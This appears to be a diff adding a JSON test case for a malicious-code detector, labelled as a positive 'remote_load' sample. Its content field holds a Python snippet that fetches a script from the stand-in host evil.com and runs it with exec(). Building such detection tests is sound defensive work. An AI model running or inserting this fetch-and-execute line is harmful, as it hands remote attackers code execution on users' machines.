@@ -1,0 +1,14 @@
+{
+  "test_case_id": "RL_POS_005",
+  "attack_type": "remote_load",
+  "sample_type": "positive",
+  "content": "# Attack sample: remote_load variant 5\nimport requests\ncode = requests.get('http://evil.com/malware.py').text\nexec(code)\n",
+  "content_hash": "4fb30e7a329c2b41",
+  "expected_result": true,
+  "metadata": {
+    "variant": "base",
+    "difficulty": "easy",
+    "created_at": "2026-03-19T07:37:00.582322",
+    "generator_version": "1.0.0"
+  }
+}
